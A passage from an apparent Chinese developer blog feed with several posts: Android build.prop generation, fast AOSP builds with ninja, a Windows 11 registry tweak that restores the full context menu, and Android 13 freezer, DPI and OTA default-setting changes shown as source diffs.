BUILD_DISPLAY_ID=&quot;$(BUILD_DISPLAY_ID)&quot; \</span><br></pre></td></tr></table></figure><p>进一步检索发现，BUILD_DISPLAY_ID的值是在build/make/core/sysprop.mk文件中定义的。这个Makefile脚本通过调用buildinfo.sh脚本，并传递一系列构建参数（如TARGET_BUILD_TYPE、BUILD_ID、BUILD_DISPLAY_ID等），最终生成了包含这些属性值的buildinfo.prop文件。这个中间产物文件位于out/target/product/XXX/obj/PACKAGING/system_build_prop_intermediates/目录下（在Android T及更高版本中，路径可能略有不同，如out/target/product/XXX/obj/ETC/system_build_prop_intermediates/）。</p><p><strong>build/make/core/sysprop.mk</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gen_from_buildinfo_sh := $(call intermediates-dir-for,PACKAGING,system_build_prop)/buildinfo.prop</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(gen_from_buildinfo_sh): $(INTERNAL_BUILD_ID_MAKEFILE) $(API_FINGERPRINT) | $(BUILD_DATETIME_FILE) $(BUILD_NUMBER_FILE)</span></span><br><span class="line">    $(hide) TARGET_BUILD_TYPE=&quot;$(TARGET_BUILD_VARIANT)&quot; \</span><br><span class="line">            TARGET_BUILD_FLAVOR=&quot;$(TARGET_BUILD_FLAVOR)&quot; \</span><br><span class="line">            TARGET_DEVICE=&quot;$(TARGET_DEVICE)&quot; \</span><br><span class="line">            PRODUCT_DEFAULT_LOCALE=&quot;$(call get-default-product-locale,$(PRODUCT_LOCALES))&quot; \</span><br><span class="line">            PRODUCT_DEFAULT_WIFI_CHANNELS=&quot;$(PRODUCT_DEFAULT_WIFI_CHANNELS)&quot; \</span><br><span class="line">            PRIVATE_BUILD_DESC=&quot;$(BUILD_DESC)&quot; \</span><br><span class="line">            BUILD_ID=&quot;$(BUILD_ID)&quot; \</span><br><span class="line">            BUILD_DISPLAY_ID=&quot;$(BUILD_DISPLAY_ID)&quot; \</span><br><span class="line">            DATE=&quot;$(DATE_FROM_FILE)&quot; \</span><br><span class="line">            BUILD_USERNAME=&quot;$(BUILD_USERNAME)&quot; \</span><br><span class="line">            BUILD_HOSTNAME=&quot;$(BUILD_HOSTNAME)&quot; \</span><br><span class="line">            BUILD_NUMBER=&quot;$(BUILD_NUMBER_FROM_FILE)&quot; \</span><br></pre></td></tr></table></figure><p>sysprop.mk文件中定义了gen_from_buildinfo_sh变量，该变量指向了buildinfo.prop文件的生成路径。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">(call intermediates-dir-for,PACKAGING,system_build_prop)/buildinfo.prop 文件中的值</span></span><br></pre></td></tr></table></figure><p>在编译产物路径下找到了buildinfo.prop文件的实际位置，并进行了实验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out\target\product\XXX\obj\PACKAGING\system_build_prop_intermediates\buildinfo.prop</span><br></pre></td></tr></table></figure><p>为了验证这一发现，我们进行了实验：首先删除buildinfo.prop文件，然后执行make命令。结果证明，当buildinfo.prop文件不存在时，构建系统会重新生成该文件，并将其内容复制到最终的system/build.prop文件中。这一实验结果进一步证实了我们的分析，即build.prop文件的生成是由build/make/core/sysprop.mk脚本控制的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out/target/product/XXX/obj/ETC/system_build_prop_intermediates/build.prop</span><br></pre></td></tr></table></figure><p>综上所述，OTA升级过程中版本号的正确使用依赖于build.prop文件的准确生成。通过深入分析和实验验证，揭示了build.prop文件的生成机制，为OTA升级过程中的版本管理提供了有力的技术支撑。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> OTA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android源码编译加速：Ninja工具详解与构建系统解析</title>
      <link href="/2024/10/04/2024-10-04/"/>
      <url>/2024/10/04/2024-10-04/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着Android操作系统的不断进化，其版本更迭日益频繁，尤其是Android 10与Android 11的源码编译过程，开发者们面临了一个显著的问题：单模块编译时间的冗长。通常情况下，完成一次单模块的编译需要耗费半个小时甚至更长时间，这主要归因于编译过程中需要重新加载全部mk文件，并经由这一系列复杂的步骤生成ninja编译文件，而这一预处理阶段异常缓慢，相比之下，实际的编译过程则显得相当迅速。</p><p>为了应对这一挑战，Google引入了ninja这一高效的编译工具，它极大地缩短了编译时间。在采用ninja进行编译时，即便是大型模块的编译也能在十几秒内迅速完成。然而，值得注意的是，ninja编译的高效性建立在源代码无大规模变动的基础上，即它最适合用于快速迭代开发中的代码修改。<strong>一旦项目涉及到文件的增加或删除，就必须回归到传统的mm/make命令来重新进行完整的编译流程。</strong></p><h1 id="使用方法详解"><a href="#使用方法详解" class="headerlink" title="使用方法详解"></a>使用方法详解</h1><p>为了利用ninja加速编译过程，开发者需要指定正确的ninja执行文件路径以及对应的lunch配置选项（通过xxx标识）。以下是几个常用的编译命令示例：</p><ul><li>编译Settings模块：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-xxx.ninja Settings -j32</span><br></pre></td></tr></table></figure><ul><li>编译selinux策略：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-xxx.ninja selinux_policy -j32</span><br></pre></td></tr></table></figure><p>通过指定-j32参数，同样实现了多线程编译优化。</p><ul><li>编译Framework框架：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-xxx.ninja framework -j32</span><br></pre></td></tr></table></figure><p>这是编译Android系统核心framework的高效方法。</p><ul><li>全编译：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-xxx.ninja -j32 2&gt;&amp;1 | tee ninja_build.log</span><br></pre></td></tr></table></figure><p>对于整个项目的全编译，此命令会将编译过程中的所有输出重定向到ninja_build.log文件中，便于后续分析和调试。</p><h1 id="相关拓展与概念解析"><a href="#相关拓展与概念解析" class="headerlink" title="相关拓展与概念解析"></a>相关拓展与概念解析</h1><p>Android的构建系统是一个复杂而强大的工具链，它由多个组件协同工作，以支持从源代码到最终二进制文件的转换过程。这些组件包括：</p><p><img src="/images/20241004/202410281512001.jpg"></p><table><thead><tr><th>名称</th><th>作用</th></tr></thead><tbody><tr><td>Android.mk</td><td>早期Android构建系统中使用的Makefile格式文件，定义了源代码的编译规则和依赖关系。</td></tr><tr><td>Ninja</td><td>一款专为速度和简洁性设计的构建系统，取代了Android.mk成为现代Android构建流程的核心。</td></tr><tr><td>Soong</td><td>新一代构建系统，旨在提供比Android.mk更灵活和可扩展的模块化设计，通过Blueprint配置语言定义构建规则。</td></tr><tr><td>Blueprint</td><td>Soong中使用的配置语言，定义了模块构建过程中需要遵循的规则和约束。</td></tr><tr><td>kati</td><td>一个基于GNU Make的增强版工具，能够解析Android.mk文件并将其转换为Ninja的构建规则。</td></tr><tr><td>Android.bp</td><td>Soong中使用的Build Blueprint文件，采用更简洁和易读的语法描述构建规则，允许开发者进行更精细的控制和优化。</td></tr></tbody></table><p>这些组件共同构成了Android源代码构建系统的基石，使得开发者能够高效、灵活地构建和定制Android操作系统及其应用程序。 </p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> ninja </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 右键菜单恢复指南</title>
      <link href="/2024/10/03/2024-10-03/"/>
      <url>/2024/10/03/2024-10-03/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>右键菜单是电脑操作系统中一个非常实用的功能，它允许用户快速执行多种操作，如复制、粘贴、删除和重命名等。然而，在Windows 11（Win11）中，一些常用的右键选项可能被隐藏，给用户带来不便。</p><h2 id="临时恢复完整右键菜单的方法"><a href="#临时恢复完整右键菜单的方法" class="headerlink" title="临时恢复完整右键菜单的方法"></a>临时恢复完整右键菜单的方法</h2><p>如果你希望暂时恢复Win10风格的完整右键菜单，只需按照以下步骤操作：</p><ol><li>按住Shift键：在需要右键操作的地方，先按住键盘上的Shift键。</li><li>点击鼠标右键：在按住Shift键的同时，点击鼠标右键。此时，你将看到一个更完整的右键菜单，其中包含了所有你需要的选项。</li></ol><p>这种方法允许你根据自己的喜好，在需要时选择使用简洁的右键菜单或完整的右键菜单。</p><h2 id="永久恢复完整右键菜单的方法"><a href="#永久恢复完整右键菜单的方法" class="headerlink" title="永久恢复完整右键菜单的方法"></a>永久恢复完整右键菜单的方法</h2><p>如果你希望永久恢复完整的右键菜单，可以尝试以下方法：</p><h4 id="通过注册表修改"><a href="#通过注册表修改" class="headerlink" title="通过注册表修改"></a>通过注册表修改</h4><ol><li>以管理员身份运行cmd：首先，你需要以管理员身份运行命令提示符（cmd）。</li></ol><p><img src="/images/20241003/20241028113619.png"></p><ol start="2"><li>复制并运行代码：在命令提示符中，复制以下代码并回车执行：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg.exe add &quot;HKCU\Software\Classes\CLSID\&#123;86ca1aa0-34aa-4e8b-a509-50c905bae2a2&#125;\InprocServer32&quot; /f /ve</span><br></pre></td></tr></table></figure><p><img src="/images/20241003/20241028113723.png"></p><p>这段代码将修改注册表中的相关设置，以恢复完整的右键菜单。</p><ol start="3"><li>重新启动电脑：执行完代码后，重新启动你的电脑。启动后，在桌面或其他地方点击鼠标右键，你将看到菜单已经恢复完整。</li></ol><p><img src="/images/20241003/20241028114008.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13 默认开启冻结进程</title>
      <link href="/2024/10/02/2024-10-02/"/>
      <url>/2024/10/02/2024-10-02/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Google 原生系统在 Android 11 及更高版本中引入了 CACHE 应用的 CPU 冻结功能。当应用进入后台且无活动状态时，系统会经过一段时间的状态判断，将该应用的进程 ID 迁移至冻结的 cgroup 节点，实现 CACHE 应用的冻结。这一机制旨在减少后台活跃缓存应用所占用的 CPU 资源，进而达到节省电量的效果。而当应用重新回到前台时，系统会迅速解冻该进程，确保应用的快速启动。</p><p>尽管 Google 在此功能上的开发步伐较为缓慢，从 Android 11 到 Android 13，该功能仍处于初步阶段，但国内众多厂商已提前布局，利用 CPU 调频、降速及冻结等核心技术，在 Android 6.0 及更高版本中实现了类似功能。</p><p>对于手持设备而言，CPU 冻结功能能够显著提升整体性能。鉴于电量和 CPU 资源的有限性，合理分配这些资源对于提升用户体验至关重要。</p><h1 id="冻结进程的作用"><a href="#冻结进程的作用" class="headerlink" title="冻结进程的作用"></a>冻结进程的作用</h1><ol><li><strong>进程的执行被暂停：</strong>冻结的进程会被暂停，其所有线程的执行将被停止，包括应用程序的主线程以及任何后台线程。</li><li><strong>资源释放：</strong>冻结进程占用的资源，例如 CPU 和内存，会被释放。这些资源将被系统重新分配给其他需要执行的进程或系统服务。</li><li><strong>电池节省：</strong>冻结进程不会在后台运行，因此可以节省设备的电池消耗。对于后台的应用程序，冻结可以降低其电池使用量，延长设备的电池寿命。</li><li><strong>系统稳定性：</strong>通过冻结不活跃或低优先级的进程，可以避免它们竞争系统资源，从而提高系统的稳定性和响应能力。</li><li><strong>快速恢复：</strong>冻结的进程可以快速恢复其执行状态。当需要重新激活进程时，系统可以迅速将其恢复到之前的运行状态，而无需重新启动或加载应用程序。</li></ol><p>值得注意的是，冻结进程并不会导致进程终止或应用程序销毁。它仅是将进程暂时挂起，以优化资源使用。当系统需要重新运行该进程时，它会立即被解冻并恢复运行。</p><h1 id="adb-命令开启应用冻结"><a href="#adb-命令开启应用冻结" class="headerlink" title="adb 命令开启应用冻结"></a>adb 命令开启应用冻结</h1><p>使用 adb 命令可以开启或关闭应用冻结功能。adb 命令格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global cached_apps_freezer &lt;enabled|disabled|default&gt;</span><br></pre></td></tr></table></figure><p>要开启应用冻结功能，可以使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global cached_apps_freezer enabled</span><br></pre></td></tr></table></figure><p><img src="/images/20241002/Screenshot_20241022-152835.jpg"></p><h1 id="代码中默认开启"><a href="#代码中默认开启" class="headerlink" title="代码中默认开启"></a>代码中默认开启</h1><p>在framework开发中，若希望默认情况下启用应用冻结功能，可以在代码中添加相应的设置。这通常涉及到对系统全局设置的修改，以确保在应用安装或系统启动时，该功能能够自动被启用。</p><p><strong>frameworks/base/packages/SettingsProvider/res/values/defaults.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">index 5cb4c404e09..c1e220b614a 100755</span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">+++ b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">@@ -339,9 +341,19 @@</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">&lt;!-- Create by yeruilai 2024-8-29 17:46:47 The process freezing function is enabled by default --&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;def_cached_apps_freezer&quot;</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span>&gt;</span>enabled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">+</span><br><span class="line"> <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">index 53eef230cac..a3c96455cfa <span class="number">100755</span></span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">+++ b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">@@ -<span class="number">2671</span>,<span class="number">6</span> +<span class="number">2679</span>,<span class="number">9</span> @@ <span class="keyword">class</span> <span class="title class_">DatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line">                     R.integer.def_backlight_saving_power_config);</span><br><span class="line"> </span><br><span class="line"> loadStringSetting(stmt, Settings.Global.WIFI_P2P_DEVICE_NAME, R.string.def_wifi_direct_name);</span><br><span class="line">+<span class="comment">// Create by yeruilai 2024-8-29 17:46:47 The process freezing function is enabled by default</span></span><br><span class="line">+loadStringSetting(stmt, Settings.Global.CACHED_APPS_FREEZER_ENABLED, </span><br><span class="line">+                    R.string.def_cached_apps_freezer);</span><br><span class="line">             <span class="comment">/*</span></span><br><span class="line"><span class="comment">              * IMPORTANT: Do not add any more upgrade steps here as the global,</span></span><br><span class="line"><span class="comment">              * secure, and system settings are no longer stored in a database</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13 修改设备的density(dpi)</title>
      <link href="/2024/10/01/2024-10-01/"/>
      <url>/2024/10/01/2024-10-01/</url>
      
        <content type="html"><![CDATA[<h1 id="DPI"><a href="#DPI" class="headerlink" title="DPI"></a>DPI</h1><p>DPI，全称Dots Per Inch，是一个衡量屏幕密度的关键指标。其中，Inch（英寸）作为物理单位，在任何设备上的大小都是恒定不变的。因此，DPI具体指的是在一英寸的物理长度内所能容纳的像素点（Dot）数量。例如，160DPI的屏幕意味着在一英寸的长度内包含160个像素点，而320DPI的屏幕则表明一英寸内含有320个像素点。由此可见，像素点的大小并不是固定的，而是随着DPI值的增加而减小。</p><p>在Android设备中，DPI被用来表示屏幕的密度（Density）。屏幕密度越大，意味着在一英寸的长度内所能显示的像素点数量越多，从而呈现出更加细腻、清晰的图像效果</p><h1 id="adb命令修改Android设备的density"><a href="#adb命令修改Android设备的density" class="headerlink" title="adb命令修改Android设备的density"></a>adb命令修改Android设备的density</h1><h3 id="1-用电脑连接上android设备-可以通过两种方式："><a href="#1-用电脑连接上android设备-可以通过两种方式：" class="headerlink" title="1. 用电脑连接上android设备 可以通过两种方式："></a>1. 用电脑连接上android设备 可以通过两种方式：</h3><ul><li><strong>无线连接：</strong>打开cmd.exe<br>  输入 adb connect 移动设备的ip地址 （一定要确保电脑的网络和移动设备的网络在同一个局域网下面）</li><li><strong>有线连接：</strong>usb数据线连接电脑和移动设备</li></ul><h3 id="2-在cmd界面输入-adb-shell-wm-density-想要修改的dpi值（160）"><a href="#2-在cmd界面输入-adb-shell-wm-density-想要修改的dpi值（160）" class="headerlink" title="2. 在cmd界面输入 adb shell wm density 想要修改的dpi值（160）"></a>2. 在cmd界面输入 adb shell wm density 想要修改的dpi值（160）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\longzhiye&gt; adb shell wm density</span><br><span class="line">Physical density: 420</span><br></pre></td></tr></table></figure><p>查看当前设备的dpi值为420</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S C:\Users\longzhiye&gt; adb shell wm density 300</span><br></pre></td></tr></table></figure><h4 id="修改前的效果"><a href="#修改前的效果" class="headerlink" title="修改前的效果"></a>修改前的效果</h4><p><img src="/images/20241001/Screenshot_20241021-170509.jpg"></p><h4 id="修改后的效果"><a href="#修改后的效果" class="headerlink" title="修改后的效果"></a>修改后的效果</h4><p><img src="/images/20241001/Screenshot_20241021-170548.jpg"></p><p>通过观察可以发现，<strong>图标和字体明显变小</strong></p><h3 id="调整到合适的DPI以后，我们需要在源码中修改"><a href="#调整到合适的DPI以后，我们需要在源码中修改" class="headerlink" title="调整到合适的DPI以后，我们需要在源码中修改"></a>调整到合适的DPI以后，我们需要在源码中修改</h3><p><strong>frameworks/base/packages/SettingsProvider/res/values/defaults.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">index 5cb4c404e09..c1e220b614a 100755</span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">+++ b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">@@ -339,9 +341,19 @@</span><br><span class="line"> </span><br><span class="line">     </span><br><span class="line">     <span class="tag">&lt;<span class="name">bool</span> <span class="attr">name</span>=<span class="string">&quot;def_status_bar_show_vibrate_icon&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">+    <span class="comment">&lt;!--Create by yeruilai 2022-12-7 10:09:39 --&gt;</span></span><br><span class="line">-<span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;def_display_density_forced&quot;</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span>&gt;</span>420<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">+    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;def_display_density_forced&quot;</span> <span class="attr">translatable</span>=<span class="string">&quot;false&quot;</span>&gt;</span>300<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">+</span><br><span class="line"> <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">index 53eef230cac..a3c96455cfa <span class="number">100755</span></span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">+++ b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">@@ -<span class="number">2448</span>,<span class="number">8</span> +<span class="number">2448</span>,<span class="number">13</span> @@ <span class="keyword">class</span> <span class="title class_">DatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line">             loadIntegerSetting(stmt, UnisocSettings.Secure.FACE_UNLOCK_REQUIRE_LIVENESSMODE,</span><br><span class="line">                     R.integer.def_facelock_liveness);</span><br><span class="line">             <span class="comment">/*@&#125;*/</span></span><br><span class="line">-<span class="comment">//loadStringSetting(stmt, Settings.Secure.DISPLAY_DENSITY_FORCED,</span></span><br><span class="line">-                    <span class="comment">//R.string.def_display_density_forced); </span></span><br><span class="line">+loadStringSetting(stmt, Settings.Secure.DISPLAY_DENSITY_FORCED,</span><br><span class="line">+                    R.string.def_display_density_forced); </span><br><span class="line">             <span class="comment">/*</span></span><br><span class="line"><span class="comment">              * IMPORTANT: Do not add any more upgrade steps here as the global,</span></span><br><span class="line"><span class="comment">              * secure, and system settings are no longer stored in a database</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13 通过OTA升级更新系统默认设置</title>
      <link href="/2024/09/22/2024-09-22/"/>
      <url>/2024/09/22/2024-09-22/</url>
      
        <content type="html"><![CDATA[<h1 id="系统进行OTA升级时更改默认设置的详细步骤"><a href="#系统进行OTA升级时更改默认设置的详细步骤" class="headerlink" title="系统进行OTA升级时更改默认设置的详细步骤"></a>系统进行OTA升级时更改默认设置的详细步骤</h1><p>在进行系统的OTA（Over-The-Air）升级过程中，如果需要对系统默认设置进行更改，以确保升级后的系统能够应用新的默认配置，那么需要执行一系列关键步骤。以下是详细的操作指南：</p><h2 id="修改设备Overlay资源"><a href="#修改设备Overlay资源" class="headerlink" title="修改设备Overlay资源"></a>修改设备Overlay资源</h2><p>首先，需要定位到设备特定的Overlay资源文件。这些资源文件通常包含了针对特定设备或品牌定制的UI元素和默认设置。<br>根据需要，对这些Overlay资源进行相应的修改，以反映新的默认设置。</p><h2 id="更新defaults-xml文件"><a href="#更新defaults-xml文件" class="headerlink" title="更新defaults.xml文件"></a>更新defaults.xml文件</h2><p>接下来，需要进入frameworks/base/packages/SettingsProvider/res/values/目录。<br>找到defaults.xml文件，并使用文本编辑器打开。<br>在该文件中，找到需要更改的默认设置项，并更新其值以匹配新的默认配置。<br>保存并关闭文件。</p><h2 id="更新SettingsProvider-java中的SETTINGS-VERSION"><a href="#更新SettingsProvider-java中的SETTINGS-VERSION" class="headerlink" title="更新SettingsProvider.java中的SETTINGS_VERSION"></a>更新SettingsProvider.java中的SETTINGS_VERSION</h2><p>然后，需要进入frameworks/base/packages/SettingsProvider/目录。<br>找到并打开SettingsProvider.java文件。<br>在该文件中，定位到SETTINGS_VERSION的定义。这个常量用于标识当前系统默认设置的版本。<br>每当默认设置有重大更改时，都应该递增这个版本的数值。<br>更新SETTINGS_VERSION的值，以确保系统能够识别并应用新的默认设置。<br>保存并关闭文件。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="修改默认值（双击电源键打开相机功能默认关闭）"><a href="#修改默认值（双击电源键打开相机功能默认关闭）" class="headerlink" title="修改默认值（双击电源键打开相机功能默认关闭）"></a>修改默认值（双击电源键打开相机功能默认关闭）</h3><p><strong>frameworks/base/packages/SettingsProvider/res/values/defaults.xml</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">index 5cb4c404e09..c1e220b614a <span class="number">100755</span></span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">+++ b/frameworks/base/packages/SettingsProvider/res/values/defaults.xml</span><br><span class="line">@@ -<span class="number">82</span>,<span class="number">7</span> +<span class="number">82</span>,<span class="number">9</span> @@</span><br><span class="line">     &lt;integer name=<span class="string">&quot;def_max_sound_trigger_detection_service_ops_per_day&quot;</span> translatable=<span class="string">&quot;false&quot;</span>&gt;<span class="number">1000</span>&lt;/integer&gt;</span><br><span class="line">     &lt;integer name=<span class="string">&quot;def_sound_trigger_detection_service_op_timeout&quot;</span> translatable=<span class="string">&quot;false&quot;</span>&gt;<span class="number">15000</span>&lt;/integer&gt;</span><br><span class="line"> </span><br><span class="line">+    &lt;!-- Create by yeruilai <span class="number">2024</span>-<span class="number">10</span>-<span class="number">11</span> <span class="number">10</span>:<span class="number">19</span>:<span class="number">02</span> Double click the power button to start the camera --&gt;</span><br><span class="line">+    &lt;integer name=<span class="string">&quot;def_camera_double_tap&quot;</span>&gt;<span class="number">1</span>&lt;/integer&gt;</span><br><span class="line">+</span><br><span class="line"> &lt;/resources&gt;</span><br></pre></td></tr></table></figure><p><strong>frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java b/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">index 53eef230cac..a3c96455cfa <span class="number">100755</span></span><br><span class="line">--- a/frameworks/base/packages/SettingsProvider/src/com/android/providers/settings/DatabaseHelper.java</span><br><span class="line">+++ 